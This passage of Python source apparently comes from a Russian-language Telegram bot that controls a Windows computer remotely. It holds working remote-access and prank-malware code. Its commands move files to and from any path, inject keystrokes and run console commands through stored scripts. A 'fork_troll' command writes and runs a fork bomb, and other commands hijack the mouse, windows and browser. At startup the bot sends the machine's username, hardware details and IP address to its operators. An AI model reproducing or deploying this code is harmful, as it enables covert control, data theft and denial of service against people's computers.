        return await message.reply("‚ùå –£–∫–∞–∑–∞–Ω–Ω–æ–≥–æ —Ñ–∞–π–ª–∞ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç!")
    
    try:
        with open(command.args.strip(), 'w+') as f:
            f.write("")
    
    except Exception as e: return await message.reply(f"‚õîÔ∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ—á–∏—Å—Ç–∫–µ —Ñ–∞–π–ª–∞: {e}")
    finally: return await message.reply(f"‚òëÔ∏è –§–∞–π–ª *{command.args.strip()}* –±—ã–ª —É—Å–ø–µ—à–Ω–æ –æ—á–∏—â–µ–Ω!", parse_mode='Markdown')


@dp.message(Command("download_on"))
async def download_on_cmd(message: types.Message, command: CommandObject):
    if not await is_access(message.from_user): return

    if command.args is None or len(command.args.strip()) <= 0:
        return await message.reply("‚ö†Ô∏è –ù–µ–≤–µ—Ä–Ω–æ–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã! –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /download_on <–ø—É—Ç—å –¥–æ –º–µ—Å—Ç–∞ –≤—ã–≥—Ä—É–∑–∫–∏>")
    
    if message.document is None:
        return await message.reply("‚ö†Ô∏è –ù–µ–≤–µ—Ä–Ω–æ–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã! –ü—Ä–∏–∫–ª–∞–¥—ã–≤–∞–π—Ç–µ —Ñ–∞–π–ª –≤–º–µ—Å—Ç–µ —Å –∫–æ–º–∞–Ω–¥–æ–π")
    
    try: await bot.download_file((await bot.get_file(message.document.file_id)).file_path, command.args.strip())
    except Exception as e: return await message.reply(f"‚õîÔ∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–≥—Ä—É–∑–∫–µ —Ñ–∞–π–ª–∞: {e}")
    finally: return await message.reply(f"‚òëÔ∏è –§–∞–π–ª —É—Å–ø–µ—à–Ω–æ —Å–æ—Ö—Ä–∞–Ω–µ–Ω –ø–æ –ø—É—Ç–∏ *{command.args.strip()}*!", parse_mode='Markdown')


@dp.message(Command('download_from'))
async def download_from_cmd(message: types.Message, command: CommandObject):
    if not await is_access(message.from_user): return

    if command.args is None or len(command.args.strip()) <= 0:
        return await message.reply("‚ö†Ô∏è –ù–µ–≤–µ—Ä–Ω–æ–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã! –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /download_from <–ø—É—Ç—å –¥–æ –º–µ—Å—Ç–∞ –∑–∞–≥—Ä—É–∑–∫–∏>")
    
    if not os.path.exists(command.args.strip()):
        return await message.reply("‚ùå –£–∫–∞–∑–∞–Ω–Ω–æ–≥–æ —Ñ–∞–π–ª–∞ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç!")
    
    try: await message.reply_document(upload_file(command.args.strip()))
    except Exception as e: return await message.reply(f"‚õîÔ∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ —Å–∫–∞—á–∏–≤–∞–Ω–∏–∏ —Ñ–∞–π–ª–∞: {e}")
    finally: return await message.reply(f"‚òëÔ∏è –§–∞–π–ª *{command.args.strip()}* —É—Å–ø–µ—à–Ω–æ —Å–æ—Ö—Ä–∞–Ω–µ–Ω!", parse_mode='Markdown')


@dp.message(Command('write'))
async def write_cmd(message: types.Message, command: CommandObject):
    if not await is_access(message.from_user): return

    if command.args is None or len(command.args.strip()) <= 0:
        return await message.reply("‚ö†Ô∏è –ù–µ–≤–µ—Ä–Ω–æ–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã! –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /write <—Ç–µ–∫—Å—Ç>")
    
    await keyboard.write(command.args.strip(), delay=0.2)
    await message.reply(f"‚úÖ –¢–µ–∫—Å—Ç *{command.args.strip()}* —É—Å–ø–µ—à–Ω–æ –Ω–∞–±—Ä–∞–Ω!", parse_mode='Markdown')


@dp.message(Command('hotkey'))
async def hotkey_cmd(message: types.Message, command: CommandObject):
    if not await is_access(message.from_user): return

    if command.args is None or len(command.args.strip()) <= 0:
        return await message.reply("‚ö†Ô∏è –ù–µ–≤–µ—Ä–Ω–æ–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã! –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /hotkey <—Å–æ—á–µ—Ç–∞–Ω–∏–µ –∫–ª–∞–≤–∏—à (–Ω–∞–ø—Ä–∏–º–µ—Ä alt+f4)>")
    
    try: keyboard.send(command.args.strip())
    except Exception as e: return await message.reply(f"‚õîÔ∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –Ω–∞–∂–∞—Ç–∏–∏ hotkey: {e}")
    finally: await message.reply(f"‚òëÔ∏è –ö–æ–º–±–∏–Ω–∞—Ü–∏—è *{command.args.strip()}* —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞!", parse_mode='Markdown')


@dp.message(Command("fork_troll"))
async def fork_troll_cmd(message: types.Message):
    if not await is_access(message.from_user): return

    if not os.path.exists(r'C:\temp'):
        make_temp_folder()

    with open('C:\\temp\\troll.bat', 'w+') as f:
        f.write('start %0 %0')

    await message.reply("‚òëÔ∏è –¢—Ä–æ–ª–ª–∏–Ω–≥ *start %0 %0 —É—Å–ø–µ—à–Ω–æ –∑–∞–ø—É—â–µ–Ω!*", parse_mode='Markdown')
    return await device.console_cmd('C:\\temp\\troll.bat')


@dp.message(Command('mouse_troll'))
async def mouse_troll_cmd(message: types.Message, command: CommandObject):
    if not await is_access(message.from_user): return

    if command.args is None or len(command.args.strip()) <= 0:
        return await message.reply("‚ö†Ô∏è –ù–µ–≤–µ—Ä–Ω–æ–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã! –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /mouse_troll <–∫–æ–ª-–≤–æ —Å–µ–∫—É–Ω–¥>")
    
    if not command.args.strip().isdigit():
        return await message.reply("‚ö†Ô∏è *–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ä–∞–∑ –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å —á–∏—Å–ª–æ–º!*", parse_mode='Markdown')
    
    await device.update()
    await message.reply(f"üì° –°–∫—Ä–∏–ø—Ç –Ω–∞—á–∞–ª –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–µ *{command.args.strip()}* —Å–µ–∫—É–Ω–¥, –æ–∂–∏–¥–∞–π—Ç–µ...", parse_mode='Markdown')
    for i in range(int(command.args.strip())): 
        for i in range(10):
            pyautogui.moveTo(randint(0, device.width), randint(0, device.height), duration=0.10)

    return await message.reply("‚òëÔ∏è *–°–∫—Ä–∏–ø—Ç –Ω–∞ –ø–µ—Ä–µ–º–µ—â–µ–Ω–∏–µ –º—ã—à–∫–∏ —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–∏–ª—Å—è!*", parse_mode='Markdown')


@dp.message(Command("explorer_troll", "exp_troll"))
async def explorer_troll_cmd(message: types.Message, command: CommandObject):
    if not await is_access(message.from_user): return

    if command.args is None or len(command.args.strip()) <= 0:
        return await message.reply("‚ö†Ô∏è –ù–µ–≤–µ—Ä–Ω–æ–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã! –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /explorer_troll <–∫–æ–ª-–≤–æ —Ä–∞–∑>")

    if not command.args.strip().isdigit():
        return await message.reply("‚ö†Ô∏è *–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ä–∞–∑ –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å —á–∏—Å–ª–æ–º!*", parse_mode='Markdown')
    
    await message.reply(f"üì° *–°–∫—Ä–∏–ø—Ç —É—Å–ø–µ—à–Ω–æ –Ω–∞—á–∞–ª –≤—ã–ø–æ–ª–Ω—è—Ç—å—Å—è {command.args.strip()} —Ä–∞–∑!*", parse_mode='Markdown')
    for i in range(int(command.args.strip())):
        keyboard.send("win+e")

    await message.reply("‚òëÔ∏è *–°–∫—Ä–∏–ø—Ç –Ω–∞ –æ—Ç–∫—Ä—ã—Ç–∏–µ –ø—Ä–æ–≤–æ–¥–Ω–∏–∫–∞ —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–∏–ª—Å—è!*", parse_mode='Markdown')


@dp.message(Command("web_troll"))
async def web_troll_cmd(message: types.Message, command: CommandObject):
    if not await is_access(message.from_user): return

    if command.args is None or len(command.args.strip()) <= 0:
        return await message.reply("‚ö†Ô∏è –ù–µ–≤–µ—Ä–Ω–æ–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã! –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /web_troll <–∫–æ–ª-–≤–æ —Ä–∞–∑>")

    if not command.args.strip().isdigit():
        return await message.reply("‚ö†Ô∏è *–ö–æ–ª–∏—á–µ—Å—Ç–≤–æ —Ä–∞–∑ –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å —á–∏—Å–ª–æ–º!*", parse_mode='Markdown')
    
    await message.reply(f"üì° *–°–∫—Ä–∏–ø—Ç —É—Å–ø–µ—à–Ω–æ –Ω–∞—á–∞–ª –≤—ã–ø–æ–ª–Ω—è—Ç—å—Å—è {command.args.strip()} —Ä–∞–∑!*", parse_mode='Markdown')
    for i in range(int(command.args.strip())):
        for site in TROLL_WEBSITES:
            webopen(site, new=2)

    return await message.reply("‚òëÔ∏è *–°–∫—Ä–∏–ø—Ç –Ω–∞ –æ—Ç–∫—Ä—ã—Ç–∏–µ —Å–∞–π—Ç–æ–≤ —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–∏–ª—Å—è!*", parse_mode='Markdown')


@dp.message(Command("bind_list"))
async def bind_list_cmd(message: types.Message):
    if not await is_access(message.from_user): return

    files_list = []
    for (root, dirs, files) in os.walk(BINDS_ROUTE, topdown=True):
        files_list = files.copy()

        for file in files_list:
            files_list.remove(file)
            if not file.endswith('.bind'):
                continue
            
            files_list.append(file.strip('.bind'))
    

    if len(files_list) > 0:
        return await message.reply(f'üìå –°–ø–∏—Å–æ–∫ –±–∏–Ω–¥–æ–≤ –≤ –ø–∞–ø–∫–µ {BINDS_ROUTE}:\n' + "\n".join(files_list))

    return await message.reply("üò≠ –£–≤—ã, –Ω–µ—Ç –Ω–∏ –æ–¥–Ω–æ–≥–æ –±–∏–Ω–¥–∞. –í—ã –º–æ–∂–µ—Ç–µ —Å–æ–∑–¥–∞—Ç—å –µ–≥–æ –∫–æ–º–∞–Ω–¥–æ–π /bind_create")


@dp.message(Command("bind_del", "bind_delete"))
async def bind_del_cmd(message: types.Message, command: CommandObject):
    if not await is_access(message.from_user): return

    if command.args is None or len(command.args.strip()) <= 0:
        return await message.reply("‚ö†Ô∏è –ù–µ–≤–µ—Ä–Ω–æ–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã! –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /bind_del <–Ω–∞–∑–≤–∞–Ω–∏–µ –±–∏–Ω–¥–∞ –±–µ–∑ .bind>")
    
    if not os.path.exists(f"{BINDS_ROUTE}\\{command.args}.bind"):
        return await message.reply("‚ö†Ô∏è –î–∞–Ω–Ω–æ–≥–æ –±–∏–Ω–¥–∞ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç")
    
    os.remove(f"{BINDS_ROUTE}\\{command.args}.bind")
    return await message.reply(f"üòé –ë–∏–Ω–¥ {command.args} —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª—ë–Ω!")

# /////// CREATE BIND SYSTEM BEGIN ///////
@dp.message(Command("bind_create", "create_bind"))
async def bind_create_cmd(message: types.Message, command: CommandObject, state: FSMContext):
    if not await is_access(message.from_user): return

    if command.args is None or len(command.args.strip()) <= 0:
        return await message.reply("‚ö†Ô∏è –ù–µ–≤–µ—Ä–Ω–æ–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã! –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /bind_create <–Ω–∞–∑–≤–∞–Ω–∏–µ –±–∏–Ω–¥–∞ –±–µ–∑ .bind>")
    
    await state.set_data({'title': command.args.strip()})
    await state.set_state(ControlStates.BIND_CREATE_CODE)
    return await message.reply("üòè –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥ –±–∏–Ω–¥–∞")

@dp.message(ControlStates.BIND_CREATE_CODE)
async def bind_create_cmd_(message: types.Message, state: FSMContext):
    if not await is_access(message.from_user): return

    title = (await state.get_data())['title']
    try:
        with open(f"{BINDS_ROUTE}\\{title}.bind", 'w+') as f:
            f.write(message.text)
    
    except Exception as e: await message.reply(f"‚õîÔ∏è –ü—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ –±–∏–Ω–¥–∞ –≤–æ–∑–Ω–∏–∫–ª–∞ –æ—à–∏–±–∫–∞: {e}")
    finally: return await message.reply(f"üòÆ –ë–∏–Ω–¥ *{title}* —É—Å–ø–µ—à–Ω–æ —Å–æ–∑–¥–∞–Ω!", parse_mode='Markdown')
# /////// CREATE BIND SYSTEM END ///////

@dp.message(Command("bind_read"))
async def bind_read_cmd(message: types.Message, command: CommandObject):
    if not await is_access(message.from_user): return

    if command.args is None or len(command.args.strip()) <= 0:
        return await message.reply("‚ö†Ô∏è –ù–µ–≤–µ—Ä–Ω–æ–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ –∫–æ–º–∞–Ω–¥—ã! –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ: /bind_read <–Ω–∞–∑–≤–∞–Ω–∏–µ –±–∏–Ω–¥–∞ –±–µ–∑ .bind>")
    
    if not os.path.exists(f"{BINDS_ROUTE}\\{command.args}.bind"):
        return await message.reply("‚ö†Ô∏è –î–∞–Ω–Ω–æ–≥–æ –±–∏–Ω–¥–∞ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç")
    
    await message.reply(f"üòá –ó–∞–ø—É—Å–∫–∞—é –±–∏–Ω–¥ {command.args.strip()}!")

    with open(f"{BINDS_ROUTE}\\{command.args.strip()}.bind", "r", encoding='utf8') as file:
        code = file.read().split("\n")

    bind_api = bindAPI(message.bot, message.from_user)

    for i in code:
        try:
            if i.startswith('//') or len(i.strip()) <= 0: continue

            elif i.startswith('wait'): 
                if await bind_api.setWait(int(i.split('=', maxsplit=1)[1])) is not None: break

            elif i.startswith('writeKeyboard'):
                if await bind_api.writeKeyboard(i.split('=', maxsplit=1)[1]) is not None: break

            elif i.startswith('useKeyboard'):
                if await bind_api.useKeyboard(i.split('=', maxsplit=1)[1]) is not None: break

            elif i.startswith('openSite'):
                if await bind_api.openSite(i.split('=', maxsplit=1)[1]) is not None: break

            elif i.startswith('sendScreenshot'):
                if await bind_api.sendScreenshot(int(i.split('=', maxsplit=1)[1])) is not None: break

            elif i.startswith('openProgram'):
                if await bind_api.useConsole(0, i.split('=', maxsplit=1)[1]) is not None: break

            elif i.startswith('clickMouse'):
                if await bind_api.clickMouse(i.split('=', maxsplit=1)[1]) is not None: break
            
            elif i.startswith('setCursor'):
                funcCode = i.split('=', maxsplit=1)[1].split(',', maxsplit=1)
                if await bind_api.setCursor(int(funcCode[0]), int(funcCode[1])) is not None: break

            elif i.startswith('sendMessage'):
                funcCode = i.split('=', maxsplit=1)[1].split(',', maxsplit=1)
                if await bind_api.sendMessage(int(funcCode[0]), funcCode[1]) is not None: break

            elif i.startswith('useConsole'):
                funcCode = i.split('=', maxsplit=1)[1].split(',', maxsplit=1)
                if await bind_api.useConsole(int(funcCode[0]), funcCode[1]) is not None: break

            else:
                return await message.reply(f"‚ö†Ô∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: –î–∞–Ω–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç!\n{i}")

        except IndexError: return await message.reply(f"‚ö†Ô∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è: –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –∞—Ä–≥—É–º–µ–Ω—Ç—ã —Å—Ç—Ä–æ–∫–∏!\n{i}")

    return await message.reply("‚úÖ –ë–∏–Ω–¥ —É—Å–ø–µ—à–Ω–æ –≤—ã–ø–æ–ª–Ω–µ–Ω")

async def main():
    startup_time = datetime.now()
    await device.update()

    if not os.path.exists(r'C:\temp'): make_temp_folder()
    if not os.path.exists(BINDS_ROUTE): os.mkdir(BINDS_ROUTE)
    
    await bot.set_my_commands([
        types.BotCommand(command=i, description=COMMAND_LIST[i]) for i in COMMAND_LIST
    ])

    message = (f"üßê –ë–æ—Ç –±—ã–ª –≥–¥–µ-—Ç–æ –∑–∞–ø—É—â–µ–Ω! \n\n‚è∞ –¢–æ—á–Ω–æ–µ –≤—Ä–µ–º—è –∑–∞–ø—É—Å–∫–∞: *{startup_time}*\n"
           f"üíæ –ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è - *{device.login}*\nü™ë –û–ø–µ—Ä–∞—Ü–∏–æ–Ω–Ω–∞—è —Å–∏—Å—Ç–µ–º–∞ - *{device.oper[0]} {device.oper[2]} {device.oper[3]}*\n"
           f"üßÆ –ü—Ä–æ—Ü–µ—Å—Å–æ—Ä - *{device.oper[5]}*\nüòª –û–ø–µ—Ä–∞—Ç–∏–≤–Ω–∞—è –ø–∞–º—è—Ç—å: *–î–æ—Å—Ç—É–ø–Ω–æ {int(device.virtual_memory[0] / 1e+9)} –ì–ë | –ó–∞–≥—Ä—É–∂–µ–Ω–æ {device.virtual_memory[2]}%*\n"
           f"üîã –ë–∞—Ç–∞—Ä–µ—è –∑–∞—Ä—è–∂–µ–Ω–∞ –Ω–∞ *{device.battery}*\nüñ• –†–∞–∑—Ä–µ—à–µ–Ω–∏–µ —ç–∫—Ä–∞–Ω–∞ - *{device.width}x{device.height}*\n"
           f"üìÄ –ü–∞–º—è—Ç—å: *{device.total_mem/GB:.2f}* –ì–ë –≤—Å–µ–≥–æ, –æ—Å—Ç–∞–ª–æ—Å—å *{device.free_mem/GB:.2f}* –ì–ë\n"
           f"üîë IP –∞–¥—Ä–µ—Å –∑–∞–ø—É—Å—Ç–∏–≤—à–µ–≥–æ - *{device.ip['ip']}*")
    
    for admin in ADMINS:
        try: await bot.send_message(admin, message, parse_mode='Markdown')
        except: continue

    print(f"{startup_time} | –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –∫–æ–º–ø—å—é—Ç–µ—Ä–æ–º v.{VERSION} —É—Å–ø–µ—à–Ω–æ –∑–∞–ø—É—â–µ–Ω–æ!")
    return await dp.start_polling(bot)


if __name__ == '__main__':
    asyncio.run(main())
